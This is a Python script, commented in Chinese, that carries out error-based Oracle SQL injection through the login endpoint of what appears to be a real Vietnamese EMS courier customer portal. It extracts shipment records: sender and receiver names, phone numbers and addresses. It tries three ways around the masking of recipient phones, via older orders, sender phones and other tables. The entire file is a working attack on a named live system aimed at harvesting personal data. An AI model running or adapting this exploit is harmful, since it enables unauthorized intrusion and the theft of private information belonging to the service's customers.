#!/usr/bin/env python3
"""
获取完整收件人电话 - 3种方法
"""

import requests
import urllib3
urllib3.disable_warnings()

URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def sqli(query):
    payload = {
        "Username": f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        "Password": "test"
    }
    try:
        resp = requests.post(URL, json=payload, verify=False, timeout=30)
        if 'thesaurus' in resp.text:
            start = resp.text.find('thesaurus ') + 10
            end = resp.text.find(' does not', start)
            if end > start:
                return resp.text[start:end]
    except:
        pass
    return None

print("=" * 70)
print("🔓 获取完整收件人电话的3种方法")
print("=" * 70)

# 方法1: 查询历史数据（有完整电话）
print("\n【方法1】查询历史订单（2022年8月，有完整电话）")
print("-" * 70)

fields = ['RECEIVER_NAME', 'RECEIVER_PHONE', 'RECEIVER_ADDRESS', 'PRODUCT_NAME', 'CREATE_DATE']

for i in range(1, 6):
    print(f"\n[历史订单 {i}]")
    for field in fields:
        val = sqli(f"SELECT {field} FROM (SELECT {field}, ROWNUM AS RN FROM (SELECT {field} FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '202208%')) WHERE RN={i}")
        if val:
            label = {'RECEIVER_NAME': '收件人', 'RECEIVER_PHONE': '电话', 'RECEIVER_ADDRESS': '地址', 'PRODUCT_NAME': '产品', 'CREATE_DATE': '日期'}[field]
            
            if field == 'RECEIVER_PHONE':
                is_full = 'xxxxx' not in val
                print(f"  {label}: {val} {'✓完整!' if is_full else '✗脱敏'}")
            else:
                print(f"  {label}: {val}")

# 方法2: 寄件人电话（永远是完整的）
print("\n\n" + "=" * 70)
print("【方法2】使用寄件人电话（今天的订单，电话完整）")
print("-" * 70)

for i in range(1, 6):
    print(f"\n[今日订单 {i}]")
    
    sender_name = sqli(f"SELECT SENDER_NAME FROM (SELECT SENDER_NAME, ROWNUM AS RN FROM (SELECT SENDER_NAME FROM EMS.SHIPMENT WHERE CREATE_DATE='20251009')) WHERE RN={i}")
    sender_phone = sqli(f"SELECT SENDER_PHONE FROM (SELECT SENDER_PHONE, ROWNUM AS RN FROM (SELECT SENDER_PHONE FROM EMS.SHIPMENT WHERE CREATE_DATE='20251009')) WHERE RN={i}")
    receiver_name = sqli(f"SELECT RECEIVER_NAME FROM (SELECT RECEIVER_NAME, ROWNUM AS RN FROM (SELECT RECEIVER_NAME FROM EMS.SHIPMENT WHERE CREATE_DATE='20251009')) WHERE RN={i}")
    receiver_phone = sqli(f"SELECT RECEIVER_PHONE FROM (SELECT RECEIVER_PHONE, ROWNUM AS RN FROM (SELECT RECEIVER_PHONE FROM EMS.SHIPMENT WHERE CREATE_DATE='20251009')) WHERE RN={i}")
    
    print(f"  寄件人: {sender_name}")
    print(f"  寄件电话: {sender_phone} ✓完整")
    print(f"  收件人: {receiver_name}")
    print(f"  收件电话: {receiver_phone} ✗脱敏")

# 方法3: 尝试其他表
print("\n\n" + "=" * 70)
print("【方法3】其他表的数据（可能有完整电话）")
print("-" * 70)

tables = [
    ('E1_SHIPCHUNG', 'CONSIGNEEPHONE', '收件电话'),
    ('DPD_ITEMS', 'RMOBILENUM', '收件手机'),
    ('SHIPMENT_SO', 'RECEIVER_PHONE', '收件电话(SO表)'),
]

for table, column, label in tables:
    print(f"\n[{table} 表]")
    
    for i in range(1, 4):
        val = sqli(f"SELECT {column} FROM (SELECT {column}, ROWNUM AS RN FROM EMS.{table}) WHERE RN={i}")
        if val and 'ORA-' not in val:
            is_full = 'xxxxx' not in val and len(val) > 5
            print(f"  {i}. {label}: {val} {'✓' if is_full else '✗'}")

# 总结
print("\n\n" + "=" * 70)
print("📊 总结")
print("=" * 70)
print("""
✅ 可以获取完整电话的方式:
   1. 查询2022年8月之前的历史订单（但是旧数据）
   2. 使用寄件人电话（今天的数据，完整）
   3. 查询其他表（如 E1_SHIPCHUNG, DPD_ITEMS）

❌ 无法获取的:
   - 2025年新订单的收件人电话（被系统永久脱敏）

💡 建议:
   - 如果需要联系客户，用寄件人电话
   - 如果做数据分析，用历史订单数据
   - 收件人电话在2025年已被隐私保护
""")

print("=" * 70)
